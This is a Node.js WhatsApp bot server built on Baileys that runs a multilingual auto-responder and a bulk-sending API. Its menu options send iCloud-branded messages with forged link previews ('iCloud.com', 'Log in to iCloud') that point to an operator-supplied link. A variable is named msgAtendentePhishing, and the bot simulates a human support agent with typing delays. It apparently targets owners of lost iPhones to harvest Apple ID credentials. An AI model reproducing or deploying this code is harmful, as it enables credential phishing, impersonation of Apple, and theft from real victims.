const express = require('express');
const cors = require('cors');
const qrcode = require('qrcode');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const pino = require('pino');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const mysql = require('mysql2/promise');
require('dotenv').config();

const app = express();
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));
app.use(express.json({ limit: '50mb' }));

// Middleware de Log
app.use((req, res, next) => {
    console.log(`[HTTP] ${req.method} ${req.url} - ${req.headers.authorization ? '(Auth)' : '(No Auth)'}`);
    next();
});

// --- Configurações de Ambiente ---
const PORT = process.env.PORT || 3000;
const SESSIONS_DIR = path.join(__dirname, 'sessions');
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

// --- Conexão Banco de Dados (Suporta Railway e Localhost) ---
const dbConfig = {
    host: process.env.MYSQLHOST || process.env.DB_HOST || 'localhost',
    user: process.env.MYSQLUSER || process.env.DB_USER || 'root',
    password: process.env.MYSQLPASSWORD || process.env.DB_PASSWORD || '',
    database: process.env.MYSQLDATABASE || process.env.DB_DATABASE || 'botzap',
    port: process.env.MYSQLPORT || 3306
};
const pool = mysql.createPool(dbConfig);

// --- Memória e Persistência ---
const sessions = new Map(); // { id: { sock, status, qr, number, userId, retryCount } }
const TRACK_LINKS_FILE = path.join(__dirname, 'trackLinks.json');
let trackLinksMap = new Map();

// --- Middleware de Autenticação Bearer ---
async function authenticate(req, res, next) {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Não autorizado. Use: Authorization: Bearer SUA_CHAVE' });
    }
    const token = authHeader.split(' ')[1];

    try {
        const [rows] = await pool.execute('SELECT user_id FROM api_keys WHERE chave = ?', [token]);
        if (rows.length === 0) {
            return res.status(401).json({ error: 'API Key inválida ou revogada.' });
        }
        req.userId = rows[0].user_id;
        next();
    } catch (err) {
        console.error('[Auth] Erro ao validar token:', err);
        res.status(500).json({ error: 'Erro interno ao validar autenticação.' });
    }
}

// --- Funções de Suporte (Rastreio e Localização) ---
async function getMediaBuffer(mediaPath) {
    if (!mediaPath) return null;
    try {
        if (mediaPath.startsWith('http')) {
            const response = await axios.get(mediaPath, { responseType: 'arraybuffer' });
            return Buffer.from(response.data);
        } else if (fs.existsSync(mediaPath)) {
            return fs.readFileSync(mediaPath);
        }
    } catch (err) {
        console.error('[Media] Erro ao obter mídia:', err.message);
    }
    return null;
}

function loadTrackLinks() {
    try {
        if (fs.existsSync(TRACK_LINKS_FILE)) {
            const data = fs.readFileSync(TRACK_LINKS_FILE, 'utf-8');
            const obj = JSON.parse(data);
            trackLinksMap = new Map();
            for (const [key, val] of Object.entries(obj)) {
                if (typeof val === 'string') {
                    trackLinksMap.set(key, { link: val, lang: 'pt' });
                } else {
                    trackLinksMap.set(key, val);
                }
            }
        }
    } catch (err) {
        console.error('[Persistence] Erro ao carregar trackLinks:', err);
    }
}
function saveTrackLinks() {
    try {
        const obj = Object.fromEntries(trackLinksMap);
        fs.writeFileSync(TRACK_LINKS_FILE, JSON.stringify(obj, null, 2));
    } catch (err) {
        console.error('[Persistence] Erro ao salvar trackLinks:', err);
    }
}

function updateTrackLinksForPhone(cleanNumber, trackLink, language) {
    let userLang = language || 'pt';
    let isPaused = false;

    // 1. Procura se algum registro existente está pausado
    for (const [k, v] of trackLinksMap.entries()) {
        if (k.startsWith(cleanNumber) || v.phone === cleanNumber) {
            if (v.paused) isPaused = true;
        }
    }

    // 2. Atualiza todos os registros que batem com este número
    let updated = false;
    for (const [k, v] of trackLinksMap.entries()) {
        if (k.startsWith(cleanNumber) || v.phone === cleanNumber) {
            v.link = trackLink;
            v.lang = userLang;
            v.paused = isPaused;
            trackLinksMap.set(k, v);
            updated = true;
        }
    }

    // 3. Se não houver registro para esse JID específico ainda, cria um
    const standardJid = `${cleanNumber}@s.whatsapp.net`;
    if (!trackLinksMap.has(standardJid)) {
        trackLinksMap.set(standardJid, { link: trackLink, lang: userLang, phone: cleanNumber, paused: isPaused });
        updated = true;
    } else {
        // Se já tem o standardJid, garante que ele está com o link novo
        const v = trackLinksMap.get(standardJid);
        v.link = trackLink;
        v.lang = userLang;
        v.paused = isPaused;
        trackLinksMap.set(standardJid, v);
    }

    if (updated) saveTrackLinks();
}
loadTrackLinks();

let botLangs = {};
const LANGS_FILE = path.join(__dirname, 'languages.json');
try {
    if (fs.existsSync(LANGS_FILE)) {
        botLangs = JSON.parse(fs.readFileSync(LANGS_FILE, 'utf-8'));
    } else {
        console.error(`[Localization] Arquivo ${LANGS_FILE} não encontrado.`);
    }
} catch (err) {
    console.error('[Localization] Erro ao carregar languages.json:', err);
}

function getMsg(lang, key, params = {}) {
    let msg = botLangs[lang]?.[key] || botLangs['pt']?.[key] || 'Text missing.';
    for (const p in params) {
        const val = params[p] || '';
        msg = msg.split(`{${p}}`).join(val);
    }
    console.log(`[getMsg] Key: ${key}, Final Length: ${msg.length}`);
    return msg;
}

// --- Thumbnail iCloud ---
let icloudThumbBuf = null;

async function carregarThumb() {
    try {
        const res = await fetch("https://i.ibb.co/Cs6D6SG4/icloud-thumb.png");
        const arrayBuffer = await res.arrayBuffer();
        icloudThumbBuf = Buffer.from(arrayBuffer);
    } catch (e) {
        console.error("Erro ao baixar thumbnail:", e);
    }
}

carregarThumb();

// --- Gerenciador de Sessões WhatsApp ---
async function startSession(sessionId, userId = null) {
    if (sessions.has(sessionId)) return;

    console.log(`[Manager] Iniciando sessão: ${sessionId}`);
    const sessionPath = path.join(SESSIONS_DIR, sessionId);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        browser: ['Botzap Pro', 'Chrome', '1.0.0']
    });

    const sessionData = { id: sessionId, sock, status: 'connecting', qr: '', number: '', userId, retryCount: 0 };
    sessions.set(sessionId, sessionData);

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
            sessionData.status = 'waiting_qr';
            try {
                sessionData.qr = await qrcode.toDataURL(qr);
                console.log(`[Session:${sessionId}] QR Code Pronto.`);
            } catch (err) {
                console.error(`[Session:${sessionId}] Erro ao gerar QR Base64:`, err);
            }
        }

        if (connection === 'close') {
            const statusCode = (lastDisconnect?.error)?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

            sessionData.status = 'disconnected';
            sessionData.qr = '';

            console.log(`[Session:${sessionId}] Conexão fechada (${statusCode}). Reconectando: ${shouldReconnect}`);

            if (shouldReconnect) {
                if (sessionData.retryCount < 10) {
                    sessionData.retryCount++;
                    const delay = Math.min(5000 * sessionData.retryCount, 30000);
                    setTimeout(() => {
                        sessions.delete(sessionId);
                        startSession(sessionId, userId);
                    }, delay);
                }
            } else {
                console.log(`[Session:${sessionId}] Logout ou erro fatal. Removendo dados.`);
                sessions.delete(sessionId);
                try {
                    fs.rmSync(sessionPath, { recursive: true, force: true });
                } catch (e) { }
            }
        } else if (connection === 'open') {
            sessionData.status = 'connected';
            sessionData.qr = '';
            sessionData.number = sock.user.id.split(':')[0];
            sessionData.retryCount = 0;
            console.log(`[Session:${sessionId}] Conectada com sucesso! (${sessionData.number})`);
        }
    });

// Webhook e Auto-Responder
sock.ev.on('messages.upsert', async (m) => {

    const msg = m.messages[0];
    if (!msg.message || msg.key.fromMe) return;

    const chatId = msg.key.remoteJid;

    // Ignorar grupos primeiro
    if (chatId.endsWith('@g.us')) return;

    const phone = chatId.split('@')[0];

    // 🔴 VERIFICA SE ESTÁ PAUSADO NO BANCO
    try {
        const [rows] = await pool.execute(
            "SELECT status FROM mensagens_enviadas WHERE numero = ? ORDER BY id DESC LIMIT 1",
            [phone]
        );

        if (rows.length && rows[0].status?.toLowerCase() === 'pausado') {
            console.log(`[PAUSE-BLOCK-DB] Atendimento pausado para ${phone}`);
            return;
        }

    } catch (err) {
        console.error('[DB PAUSE ERROR]', err.message);
    }

        // DB Webhook Dispatch
        let targetUserId = sessionData.userId;

        // Se a sessão foi carregada do disco sem userId, tenta pegar o admin (ID 2) para o teste
        if (!targetUserId) targetUserId = 2;

        if (targetUserId) {
            try {
                const [rows] = await pool.execute('SELECT webhook_url FROM user_configs WHERE user_id = ?', [targetUserId]);
                if (rows.length > 0 && rows[0].webhook_url) {
                    const payload = {
                        session: sessionId,
                        from: chatId.split('@')[0],
                        message: msg.message.conversation || msg.message.extendedTextMessage?.text || '',
                        timestamp: new Date().toISOString(),
                        pushName: msg.pushName
                    };
                    console.log(`[Webhook] Enviando para ${rows[0].webhook_url}... (UserId: ${targetUserId})`);
                    axios.post(rows[0].webhook_url, payload)
                        .then(() => console.log(`[Webhook] Sucesso: Session ${sessionId}`))
                        .catch((e) => {
                            console.error(`[Webhook] ERRO FATAL ao enviar para ${rows[0].webhook_url}:`, e.message);
                        });
                } else {
                    console.log(`[Webhook] Nenhuma URL configurada para User ID ${targetUserId}`);
                }
            } catch (e) { console.error(`[Webhook] Erro ao buscar webhook_url para ${targetUserId}:`, e.message); }
        }

        // --- TRAVA DE SEGURANÇA ---
        if (!trackLinksMap.has(chatId)) {
            console.log(`[Bot] Novo ID detectado: ${chatId}. Tentando pareamento...`);
            const altJid = msg.key.remoteJidAlt;
            let foundData = null;

            if (altJid && trackLinksMap.has(altJid)) {
                foundData = trackLinksMap.get(altJid);
            }

            if (!foundData) {
            
                const phoneTail = phone.slice(-8);
                for (const [k, v] of trackLinksMap.entries()) {
                    const mapPhone = (v.phone || k.split('@')[0]).toString();
                    if (mapPhone.endsWith(phoneTail)) {
                        foundData = v;
                        break;
                    }
                }
            }

            if (foundData) {
                console.log(`[Bot] Pareamento bem-sucedido para ${chatId} com dados de ${foundData.phone}`);
                trackLinksMap.set(chatId, foundData);
                saveTrackLinks();
            } else {
                return;
            }
        }

        const contactData = trackLinksMap.get(chatId);
        console.log(`[PAUSE-CHECK] Verificando ${chatId}. Pausado? ${contactData?.paused}. Dados:`, JSON.stringify(contactData));

        const pushName = msg.pushName ? ` ${msg.pushName}` : '';
        let inTexto = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.templateButtonReplyMessage?.selectedDisplayText || '';
        let normalizeTxt = inTexto.trim().toUpperCase();

        if (contactData?.paused === true || contactData?.paused === 'true') {
            console.log(`[PAUSE-BLOCK] Atendimento BLOQUEADO para ${chatId}`);
            return;
        }

        console.log(`[PAUSE-ALLOW] Atendimento LIBERADO para ${chatId}`);

        let linkRecuperacao = contactData?.link || 'https://icloud.com/find';
        let userLang = contactData?.lang || 'pt';

        const triggers = {
            'pt': ['INICIAR', 'INICAR', 'AJUDA', '"AJUDA"', 'MUDAR IDIOMA'],
            'en': ['HELP', '"HELP"', 'CHANGE LANGUAGE'],
            'es': ['AYUDA', '"AYUDA"', 'CAMBIAR IDIOMA'],
            'zh': ['帮助', '开始', '修改语言'],
            'fr': ['AIDE', 'COMMENCER', 'CHANGER DE LANGUE'],
            'ar': ['مساعدة', 'ابدأ', 'تغيير اللغة'],
            'ru': ['ПОМОЩЬ', 'НАЧАТЬ', 'ИЗМЕНИТЬ ЯЗЫК'],
            'sv': ['HJÄLP', 'STARTA', 'BYT SPRÅK']
        };
        let detectedLang = null;
        for (const [lang, words] of Object.entries(triggers)) {
            if (words.some(w => normalizeTxt.includes(w))) {
                detectedLang = lang;
                break;
            }
        }

        const changeLanguageTriggers = ['MUDAR IDIOMA', 'CHANGE LANGUAGE', 'CAMBIAR IDIOMA', '修改语言', 'CHANGER DE LANGUE', 'تغيير اللغة', 'ИЗМЕНИΤЬ ЯЗЫК', 'BYT SPRÅK'];
        const isChangeLanguage = changeLanguageTriggers.some(w => normalizeTxt.includes(w));

        if (detectedLang || isChangeLanguage) {
            if (isChangeLanguage) {
                if (contactData) delete contactData.lang;
                saveTrackLinks();
                await sock.sendMessage(chatId, { text: "Selecione seu idioma\nSelect your language\n选择您的语言\nChoisissez votre langue\nاختر لغتك\nVälj ditt språk" });
                return;
            }

            userLang = detectedLang;
            if (contactData) contactData.lang = userLang;
            saveTrackLinks();

            const replyMenuText = getMsg(userLang, 'menu_greeting', { name: pushName.trim() });
            try {
                await sock.sendMessage(chatId, { react: { text: "🤖", key: msg.key } });
                setTimeout(async () => {
                    await sock.presenceSubscribe(chatId);
                    await sock.sendPresenceUpdate('composing', chatId);
                    setTimeout(async () => {
                        await sock.sendPresenceUpdate('paused', chatId);
                        await sock.sendMessage(chatId, { text: replyMenuText });
                    }, 3000);
                }, 1000);
            } catch (err) { }
        }
        else if (!contactData || !contactData.lang) {
            await sock.sendMessage(chatId, { text: "Selecione seu idioma\nSelect your language\n选择您的语言\nChoisissez votre langue\nاختر لغتك\nVälj ditt språk" });
            return;
        }
        else if (normalizeTxt === '1' || normalizeTxt.includes('LOCALIZAR') || normalizeTxt.includes('LOCATE') || normalizeTxt.includes('BUSCAR') || normalizeTxt.includes('📍')) {
            const replyLink = getMsg(userLang, 'option_1', { name: pushName.trim(), link: linkRecuperacao });
            const customPreview = { title: 'iCloud.com', description: 'Log in to iCloud to access your photos, mail, not...', 'canonical-url': linkRecuperacao, 'matched-text': linkRecuperacao, jpegThumbnail: icloudThumbBuf };

            try {
                await sock.sendMessage(chatId, { react: { text: "🤖", key: msg.key } });
                setTimeout(async () => {
                    await sock.presenceSubscribe(chatId);
                    await sock.sendPresenceUpdate('composing', chatId);
                    setTimeout(async () => {
                        await sock.sendPresenceUpdate('paused', chatId);
                        await sock.sendMessage(chatId, { text: replyLink, linkPreview: customPreview });
                    }, 6000);
                }, 1000);
            } catch (err) { }
        } else if (normalizeTxt === '3' || normalizeTxt.includes('APPLECARE') || normalizeTxt.includes('SOPORTE') || normalizeTxt.includes('🛡️')) {
            const replyOption3 = getMsg(userLang, 'option_3', { link: linkRecuperacao });
            const customPreview = { title: 'iCloud.com', description: 'Log in to iCloud to access your photos, mail, not...', 'canonical-url': linkRecuperacao, 'matched-text': linkRecuperacao, jpegThumbnail: icloudThumbBuf };
            try {
                await sock.sendMessage(chatId, { react: { text: "🤖", key: msg.key } });
                setTimeout(async () => {
                    await sock.presenceSubscribe(chatId);
                    await sock.sendPresenceUpdate('composing', chatId);
                    setTimeout(async () => {
                        await sock.sendPresenceUpdate('paused', chatId);
                        await sock.sendMessage(chatId, { text: replyOption3, linkPreview: customPreview });
                    }, 6000);
                }, 1000);
            } catch (err) { }
        } else if (normalizeTxt === '2' || normalizeTxt.includes('RECUPERAR') || normalizeTxt.includes('RECOVER') || normalizeTxt.includes('🔑')) {
            const replyOption2 = getMsg(userLang, 'option_2', { link: linkRecuperacao });
            const customPreview = { title: 'iCloud.com', description: 'Log in to iCloud to access your photos, mail, not...', 'canonical-url': linkRecuperacao, 'matched-text': linkRecuperacao, jpegThumbnail: icloudThumbBuf };
            try {
                await sock.sendMessage(chatId, { react: { text: "🤖", key: msg.key } });
                setTimeout(async () => {
                    await sock.presenceSubscribe(chatId);
                    await sock.sendPresenceUpdate('composing', chatId);
                    setTimeout(async () => {
                        await sock.sendPresenceUpdate('paused', chatId);
                        await sock.sendMessage(chatId, { text: replyOption2, linkPreview: customPreview });
                    }, 6000);
                }, 1000);
            } catch (err) { }
        } else if (normalizeTxt === '4' || normalizeTxt.includes('ATENDENTE') || normalizeTxt.includes('HABLAR') || normalizeTxt.includes('AGENT') || normalizeTxt.includes('👨‍💼')) {
            const msgFila = getMsg(userLang, 'option_4_wait', { name: pushName.trim() });
            try {
                await sock.sendMessage(chatId, { react: { text: "🤖", key: msg.key } });
                setTimeout(async () => {
                    await sock.presenceSubscribe(chatId);
                    await sock.sendPresenceUpdate('composing', chatId);
                    setTimeout(async () => {
                        await sock.sendPresenceUpdate('paused', chatId);
                        await sock.sendMessage(chatId, { text: msgFila });
                        setTimeout(async () => {
                            await sock.sendPresenceUpdate('composing', chatId);
                            setTimeout(async () => {
                                const msgAtendente = getMsg(userLang, 'option_4_agent', { name: pushName.trim() });
                                await sock.sendPresenceUpdate('paused', chatId);
                                await sock.sendMessage(chatId, { text: msgAtendente });
                            }, 4000);
                        }, 7000);
                    }, 3000);
                }, 1000);
            } catch (err) { }
        } else if (normalizeTxt === '5') {
            const msgMenuInicial = getMsg(userLang, 'menu_greeting', { name: pushName.trim() });
            try {
                await sock.sendMessage(chatId, { react: { text: "🤖", key: msg.key } });
                setTimeout(async () => {
                    await sock.presenceSubscribe(chatId);
                    await sock.sendPresenceUpdate('composing', chatId);
                    setTimeout(async () => {
                        await sock.sendPresenceUpdate('paused', chatId);
                        await sock.sendMessage(chatId, { text: msgMenuInicial });
                        setTimeout(async () => {
                            await sock.sendPresenceUpdate('composing', chatId);
                            setTimeout(async () => {
                                const msgAtendentePhishing = getMsg(userLang, 'option_5_agent', { name: pushName.trim(), link: linkRecuperacao });
                                await sock.sendPresenceUpdate('paused', chatId);
                                await sock.sendMessage(chatId, { text: msgAtendentePhishing });
                            }, 4000);
                        }, 4000);
                    }, 3000);
                }, 1000);
            } catch (err) { }
        } else if (normalizeTxt === '6') {
            const replyOption6 = getMsg(userLang, 'option_6', { name: pushName.trim(), link: linkRecuperacao });
            const customPreview = { title: 'iCloud.com', description: 'Log in to iCloud to access your photos, mail, not...', 'canonical-url': linkRecuperacao, 'matched-text': linkRecuperacao, jpegThumbnail: icloudThumbBuf };
            try {
                await sock.sendMessage(chatId, { react: { text: "🤖", key: msg.key } });
                setTimeout(async () => {
                    await sock.presenceSubscribe(chatId);
                    await sock.sendPresenceUpdate('composing', chatId);
                    setTimeout(async () => {
                        await sock.sendPresenceUpdate('paused', chatId);
                        await sock.sendMessage(chatId, { text: replyOption6, linkPreview: customPreview });
                    }, 6000);
                }, 1000);
            } catch (err) { }
        } else {
            if (normalizeTxt === 'VOTO_COMPUTADO') return;
            const msgError = getMsg(userLang, 'fallback');
            try {
                await sock.sendMessage(chatId, { react: { text: "🤖", key: msg.key } });
                setTimeout(async () => {
                    await sock.presenceSubscribe(chatId);
                    await sock.sendPresenceUpdate('composing', chatId);
                    setTimeout(async () => {
                        await sock.sendPresenceUpdate('paused', chatId);
                        await sock.sendMessage(chatId, { text: msgError });
                    }, 3000);
                }, 1000);
            } catch (err) { }
        }
    });
}

// Inicializar sessões existentes
fs.readdirSync(SESSIONS_DIR).forEach(dir => {
    if (fs.existsSync(path.join(SESSIONS_DIR, dir, 'creds.json'))) startSession(dir);
});

// --- API Endpoints Profissionais ---

app.post('/api/create-session', authenticate, async (req, res) => {
    const { session } = req.body;
    if (!session) return res.status(400).json({ error: 'Nome da sessão é obrigatório.' });

    if (sessions.has(session)) {
        const s = sessions.get(session);
        s.userId = req.userId; // Atualiza o vínculo do usuário
        console.log(`[Manager] Sessão '${session}' vinculada ao User ID: ${req.userId}`);
        return res.json({ success: true, message: 'Sessão vinculada ao usuário com sucesso.', session });
    }

    await startSession(session, req.userId);
    res.json({ success: true, message: 'Sessão inicializada e vinculada.', session });
});

app.get('/api/qrcode/:session', authenticate, (req, res) => {
    const s = sessions.get(req.params.session);
    if (!s) return res.status(404).json({ error: 'Sessão não encontrada.' });
    res.json({ session: s.id, qr: s.qr });
});

app.get('/api/status/:session', authenticate, (req, res) => {
    const s = sessions.get(req.params.session);
    if (!s) return res.status(404).json({ error: 'Sessão não encontrada.' });
    res.json({ session: s.id, status: s.status, number: s.number });
});

app.post('/api/send-message', authenticate, async (req, res) => {
    const { session, number, message, mediaPath, trackLink, language, option, name } = req.body;
    const s = sessions.get(session);
    if (!s || s.status !== 'connected') return res.status(403).json({ error: 'Sessão não conectada.' });

    try {
        const cleanNumber = number.replace(/\D/g, '');
        const chatId = `${cleanNumber}@s.whatsapp.net`;

        let userLang = language || 'pt';

        // Atualiza o rastreio no banco em memória
        if (trackLink) {
            updateTrackLinksForPhone(cleanNumber, trackLink, userLang);
        }

        // --- NOVO: SISTEMA DE TEMPLATES (A API SEGUE O ROBÔ COM THUMBNAIL) ---
        if (option !== undefined) {
            let linkRecuperacao = trackLink || 'https://icloud.com/find';
            let pushName = name ? ` ${name}` : '';

            // Se for a Opção 1, 2, 3 ou 6 (que usam links e thumbnail no bot)
            if ([1, 2, 3, 6].includes(option)) {
                const optKey = `option_${option}`;
                const replyText = getMsg(userLang, optKey, { name: pushName.trim(), link: linkRecuperacao });

                // Força o WhatsApp Desktop/Web a renderizar a miniatura
                const customPreview = {
                    title: 'iCloud.com',
                    description: 'Log in to iCloud to access your photos, mail, not...',
                    'canonical-url': linkRecuperacao,
                    'matched-text': linkRecuperacao,
                    jpegThumbnail: icloudThumbBuf
                };

                await s.sock.sendMessage(chatId, { text: replyText, linkPreview: customPreview });
                return res.json({ status: 'success', message: `Template da Opção ${option} enviado com thumbnail perfeitamente!` });
            }
        }

        // --- EXECUÇÃO DO ENVIO ---
        const imageBuffer = await getMediaBuffer(mediaPath);
        if (imageBuffer) {
            await s.sock.sendMessage(chatId, { image: imageBuffer, caption: message });
        } else if (message) {
            await s.sock.sendMessage(chatId, { text: message });
        } else if (option === undefined) {
            return res.status(400).json({ error: 'Nenhuma mensagem ou opção válida fornecida.' });
        }

        let finalLoggedText = message;
        if (option !== undefined && [1, 2, 3, 6].includes(option)) {
            let linkRecuperacao = trackLink || 'https://icloud.com/find';
            let pushName = name ? ` ${name}` : '';
            finalLoggedText = getMsg(userLang, `option_${option}`, { name: pushName.trim(), link: linkRecuperacao });
        }

        // Inserir no Banco de Dados (Histórico do Painel)
        try {
            await pool.execute(
                "INSERT INTO mensagens_enviadas (user_id, numero, modelo, capacidade, cor, tipo_imagem, caminho_link, link_rastreio, texto_final, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                [req.userId || null, cleanNumber, "API Pro", "Personalizado", "Blue", (mediaPath ? 'local' : 'text'), (mediaPath || ''), (trackLink || ''), finalLoggedText, 'ativo']
            );
            console.log(`[Database] Log de Auditoria inserido para ${cleanNumber} (User: ${req.userId})`);
        } catch (dbErr) {
            console.error(`[Database] Erro ao inserir log de atividade:`, dbErr.message);
        }

        res.json({ status: 'success', message: 'Mensagem enviada e registrada!' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.delete('/api/sessions/:id', authenticate, async (req, res) => {
    const s = sessions.get(req.params.id);
    if (s) {
        try { await s.sock.logout(); } catch (e) { }
        sessions.delete(req.params.id);
    }
    const p = path.join(SESSIONS_DIR, req.params.id);
    if (fs.existsSync(p)) fs.rmSync(p, { recursive: true, force: true });
    res.json({ success: true });
});

// --- Rotas de Compatibilidade para o Painel Legado ---
app.get('/api/sessions/:id/qr', authenticate, (req, res) => {
    const s = sessions.get(req.params.id);
    if (!s) return res.status(404).json({ error: 'Sessão não existe' });
    res.json({ qr: s.qr });
});

app.post('/api/sessions', authenticate, async (req, res) => {
    const { sessionId } = req.body;
    if (!sessionId) return res.status(400).json({ error: 'ID da sessão é necessário' });
    const cleanId = sessionId.replace(/[^A-Za-z0-9_\- ]/g, '');
    await startSession(cleanId, req.userId);
    res.json({ success: true, sessionId: cleanId });
});

// Endpoints legados para o painel (com bypass local por enquanto ou Bearer compatível)
app.get('/api/stats', (req, res) => {
    const list = Array.from(sessions.values());
    res.json({
        total: list.length,
        connected: list.filter(s => s.status === 'connected').length,
        waiting: list.filter(s => s.status === 'waiting_qr').length,
        disconnected: list.filter(s => s.status === 'disconnected' || s.status === 'connecting').length
    });
});

app.get('/api/sessions', (req, res) => {
    res.json(Array.from(sessions.values()).map(s => ({ id: s.id, status: s.status, number: s.number, hasQr: !!s.qr })));
});

// Disparo Legacy (Protegido e Logado)
app.post('/api/send', authenticate, async (req, res) => {
    const { sessionId, session, number, message, mediaPath, trackLink, language } = req.body;
    const s = sessions.get(sessionId || session || 'default');
    if (!s || s.status !== 'connected') return res.status(403).json({ error: 'Dispositivo offline' });

    const cleanNumber = number.replace(/\D/g, '');
    const chatId = `${cleanNumber}@s.whatsapp.net`;

    if (trackLink) {
        updateTrackLinksForPhone(cleanNumber, trackLink, language);
    }

    try {
        const imageBuffer = await getMediaBuffer(mediaPath);
        if (imageBuffer) {
            await s.sock.sendMessage(chatId, { image: imageBuffer, caption: message });
        } else {
            await s.sock.sendMessage(chatId, { text: message });
        }

        // Inserir no Banco de Dados (Histórico do Painel)
        try {
            await pool.execute(
                "INSERT INTO mensagens_enviadas (user_id, numero, modelo, capacidade, cor, tipo_imagem, caminho_link, link_rastreio, texto_final, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                [req.userId || null, cleanNumber, "API Legacy", "Personalizado", "Black", (mediaPath ? 'local' : 'text'), (mediaPath || ''), (trackLink || ''), message, 'ativo']
            );
            console.log(`[Database] Log de Auditoria (Legacy) inserido para ${cleanNumber} (User: ${req.userId})`);
        } catch (dbErr) {
            console.error(`[Database] Erro ao inserir log de atividade (Legacy):`, dbErr.message);
        }

        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.toString() });
    }
});

// Admin endpoints (mantidos)
app.post('/delete-track', (req, res) => {
    const { number } = req.body;
    if (!number) return res.status(400).json({ error: 'Número obrigatório' });
    const clean = number.replace(/\D/g, '');
    for (const [k, v] of trackLinksMap.entries()) {
        if (k.startsWith(clean) || v.phone === clean) trackLinksMap.delete(k);
    }
    saveTrackLinks();
    res.json({ success: true });
});

app.post('/toggle-pause', (req, res) => {
    const { number, pause } = req.body;
    if (!number) return res.status(400).json({ error: 'Número obrigatório' });
    const clean = number.replace(/\D/g, '');
    console.log(`[PAUSE-REQ] Recebido para ${clean}. Pausar? ${pause}`);

    let found = false;

    // 1. Atualiza registros existentes (busca por JID ou por campo phone)
    for (const [k, v] of trackLinksMap.entries()) {
        if (k.startsWith(clean) || v.phone === clean) {
            v.paused = !!pause;
            trackLinksMap.set(k, v);
            found = true;
            console.log(`[PAUSE-SYNC] Atualizado: ${k} -> paused: ${v.paused}`);
        }
    }

    // 2. Se não encontrou, cria um registro preventivo
    if (!found) {
        const jid = `${clean}@s.whatsapp.net`;
        trackLinksMap.set(jid, {
            paused: !!pause,
            phone: clean,
            link: 'https://icloud.com',
            lang: 'pt'
        });
        console.log(`[PAUSE-NEW] Criado preventivo: ${jid} -> paused: ${!!pause}`);
    }

    saveTrackLinks();
    res.json({ success: true, message: pause ? 'Pausado' : 'Ativado' });
});

app.post('/clear-all', (req, res) => {
    trackLinksMap.clear();
    saveTrackLinks();
    res.json({ success: true });
});

app.post('/api/control/pause', authenticate, async (req, res) => {
    const { number, pause } = req.body;

    if (!number) {
        return res.status(400).json({ error: 'Número é obrigatório' });
    }

    const clean = number.replace(/\D/g, '');
    const status = pause ? 'pausado' : 'ativo';

    try {

        // 🔴 TENTA ATUALIZAR
        let [result] = await pool.execute(
            "UPDATE mensagens_enviadas SET status = ? WHERE numero = ? AND user_id = ?",
            [status, clean, req.userId]
        );

        // 🔵 SE NÃO EXISTIR REGISTRO, CRIA
        if (result.affectedRows === 0) {
            await pool.execute(
                "INSERT INTO mensagens_enviadas (numero, status, user_id) VALUES (?, ?, ?)",
                [clean, status, req.userId]
            );
        }

        // 🟢 ATUALIZA MEMÓRIA DO BOT
        let found = false;

        for (const [k, v] of trackLinksMap.entries()) {
            if (k.startsWith(clean) || v.phone === clean) {
                v.paused = !!pause;
                trackLinksMap.set(k, v);
                found = true;
            }
        }

        if (!found) {
            trackLinksMap.set(`${clean}@s.whatsapp.net`, {
                paused: !!pause,
                phone: clean,
                link: 'https://icloud.com',
                lang: 'pt'
            });
        }

        saveTrackLinks();

        res.json({
            success: true,
            message: `Status alterado para ${status}`
        });

    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});


app.post('/api/control/delete', authenticate, async (req, res) => {

    const { number } = req.body;

    if (!number) {
        return res.status(400).json({ error: 'Número é obrigatório' });
    }

    const clean = number.replace(/\D/g, '');

    try {

        const [result] = await pool.execute(
            "DELETE FROM mensagens_enviadas WHERE numero = ? AND user_id = ?",
            [clean, req.userId]
        );

        if (result.affectedRows > 0) {

            for (const [k, v] of trackLinksMap.entries()) {
                if (k.startsWith(clean) || v.phone === clean) {
                    trackLinksMap.delete(k);
                }
            }

            saveTrackLinks();

            res.json({
                success: true,
                message: 'Ordem removida'
            });

        } else {

            res.status(404).json({
                error: 'Ordem não encontrada'
            });

        }

    } catch (e) {

        res.status(500).json({
            error: e.message
        });

    }

});


app.listen(PORT, () => {
    console.log(`[Server] WhatsApp BOT API na porta ${PORT}`);
});
